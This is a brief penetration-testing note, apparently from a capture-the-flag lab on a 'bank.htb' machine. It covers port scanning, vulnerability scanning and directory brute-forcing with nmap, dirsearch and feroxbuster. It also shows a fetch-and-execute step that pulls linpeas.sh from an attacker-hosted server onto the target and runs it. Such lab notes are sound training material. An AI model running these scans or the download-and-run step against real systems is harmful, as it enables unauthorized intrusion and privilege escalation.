# Enumerate

Enumeration is the process of gathering information about a target. This can be done in a variety of ways, such as scanning for open ports, identifying services running on those ports, and identifying vulnerabilities in those services. The goal of enumeration is to gather as much information as possible about the target, so that you can identify potential attack vectors and plan your attack accordingly.

## Inside the machine

A easy workaround is to use a script like `linpeas.sh` to enumerate the system. This script will gather information about the system and identify potential vulnerabilities that can be exploited.

In our machine we do the following:

```bash
cd /tmp
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
sudo python3 -m http.server 8000
```

In the target machine we do the following:

```bash
wget http://<your-ip>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

## Outside the machine

If you are outside the machine, you can use tools like `nmap` to scan for open ports and identify services running on those ports. Once you have identified the services running on the target, you can use tools like `nmap` and `searchsploit` to identify potential vulnerabilities in those services.

```bash
nmap -p- -T4 --min-rate 5000 -sV -A -o bank <IP>
nmap --script vuln -o vuln <IP>
dirsearch -u http://bank.htb -e php -m GET directory_list_lowercase_2.3_medium.txt
feroxbuster -u http://bank.htb -o ferox -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -C 401
whatweb <IP>
```